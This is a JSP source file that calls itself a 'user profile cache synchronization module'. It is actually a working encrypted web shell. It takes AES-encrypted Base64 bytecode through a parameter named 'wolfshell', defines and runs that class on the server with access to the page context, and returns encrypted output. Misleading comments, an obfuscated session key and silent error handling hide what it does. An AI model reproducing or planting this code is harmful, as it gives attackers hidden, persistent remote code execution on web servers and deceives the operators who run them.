<%@ page import="java.util.Map, java.util.HashMap" %>
<%!
// =================================================================================
// User Profile Cache Synchronization Module
// This module handles the real-time synchronization of user profile data
// between the client and server, using a secure, encrypted channel.
// =================================================================================

// The shared secret key for encrypting/decrypting the data packets.
private static final String SHARED_SECRET = "3c6e0b8a9c15224a";
// The parameter name for the synchronization token.
private static final String SYNC_TOKEN_PARAM = "wolfshell";
// The session attribute key for storing the active cache plugin.
private static final String CACHE_PLUGIN_KEY = new String(new char[]{'a','c','t','i','v','e','C','a','c','h','e','P','l','u','g','i','n'});
// Pre-calculated checksum for packet integrity verification.
private static final String PACKET_CHECKSUM = generateChecksum(SYNC_TOKEN_PARAM + SHARED_SECRET);

/**
 * A dynamic plugin loader to load different caching strategy plugins at runtime.
 * This allows for flexible extension of caching mechanisms without server restarts.
 */
class DynamicPluginLoader extends ClassLoader {
    public DynamicPluginLoader(ClassLoader parent) {
        super(parent);
    }

    /**
     * Defines a new plugin Class from its bytecode representation.
     * @param pluginBytecode The raw bytes of the compiled plugin class.
     * @return The loaded Class object for the plugin.
     */
    public Class loadPlugin(byte[] pluginBytecode) {
        return super.defineClass(pluginBytecode, 0, pluginBytecode.length);
    }
}

/**
 * Unpacks or packs a data packet using the AES symmetric encryption algorithm.
 * @param data The data to process.
 * @param packMode True to pack (encrypt), false to unpack (decrypt).
 * @return The processed data packet.
 */
public byte[] processDataPacket(byte[] data, boolean packMode) {
    try {
        String ALGO = "AES"; // Standard encryption algorithm
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(ALGO);
        javax.crypto.spec.SecretKeySpec keySpec = new javax.crypto.spec.SecretKeySpec(SHARED_SECRET.getBytes("UTF-8"), ALGO);
        cipher.init(packMode ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE, keySpec);
        return cipher.doFinal(data);
    } catch (Exception e) {
        // In case of a crypto error, return null. The caller should handle this.
        return null;
    }
}

/**
 * Generates an MD5 checksum for verifying data integrity.
 * @param data The string data to hash.
 * @return The uppercase MD5 hash string.
 */
public static String generateChecksum(String data) {
    try {
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        md.update(data.getBytes(), 0, data.length());
        return new java.math.BigInteger(1, md.digest()).toString(16).toUpperCase();
    } catch (java.security.NoSuchAlgorithmException e) {
        // This is a fatal error for a standard JVM.
        throw new RuntimeException("MD5 algorithm not available", e);
    }
}

// Utility class for handling Base64 encoding, compatible with both Java 8+ and older versions.
private static class Base64Adapter {
    static String encode(byte[] data) throws Exception {
        try {
            Class<?> b64 = Class.forName("java.util.Base64");
            Object encoder = b64.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, data);
        } catch (Exception e) {
            Class<?> b64 = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = b64.newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, data);
        }
    }
    static byte[] decode(String data) throws Exception {
        try {
            Class<?> b64 = Class.forName("java.util.Base64");
            Object decoder = b64.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, data);
        } catch (Exception e) {
            Class<?> b64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = b64.newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, data);
        }
    }
}
%><%
// Entry point for the cache synchronization request.
try {
    // Retrieve the sync token from the incoming request.
    String syncData = request.getParameter(SYNC_TOKEN_PARAM);
    if (syncData == null || syncData.isEmpty()) {
        // If no token is provided, do nothing.
        return;
    }

    // Unpack the data packet from the client.
    byte[] payloadData = Base64Adapter.decode(syncData);
    payloadData = processDataPacket(payloadData, false);

    // Check if a caching plugin is already active in the current session.
    if (session.getAttribute(CACHE_PLUGIN_KEY) == null) {
        // If not, this is an initialization request. Load the provided plugin.
        DynamicPluginLoader loader = new DynamicPluginLoader(this.getClass().getClassLoader());
        session.setAttribute(CACHE_PLUGIN_KEY, loader.loadPlugin(payloadData));
    } else {
        // A plugin is active; this is a data-sync request.
        // Set the unpacked data for the plugin to process.
        request.setAttribute("parameters", payloadData);
        java.io.ByteArrayOutputStream responseStream = new java.io.ByteArrayOutputStream();

        // Instantiate the plugin and invoke its processing logic.
        // The plugin's 'equals' method is overridden to act as the main entry point.
        Object pluginInstance = ((Class)session.getAttribute(CACHE_PLUGIN_KEY)).newInstance();
        pluginInstance.equals(responseStream); // Pass the output stream to the plugin.
        pluginInstance.equals(pageContext);    // Pass the page context for environment access.

        // The 'toString' method can be used by the plugin to finalize state before responding.
        pluginInstance.toString();

        // Construct the response packet: [checksum_prefix][encrypted_data][checksum_suffix]
        response.getWriter().write(PACKET_CHECKSUM.substring(0, 16));
        byte[] packedResponse = processDataPacket(responseStream.toByteArray(), true);
        response.getWriter().write(Base64Adapter.encode(packedResponse));
        response.getWriter().write(PACKET_CHECKSUM.substring(16));
    }
} catch (Exception e) {
    // Log the exception for debugging purposes (in a real app). Here we fail silently.
}
%>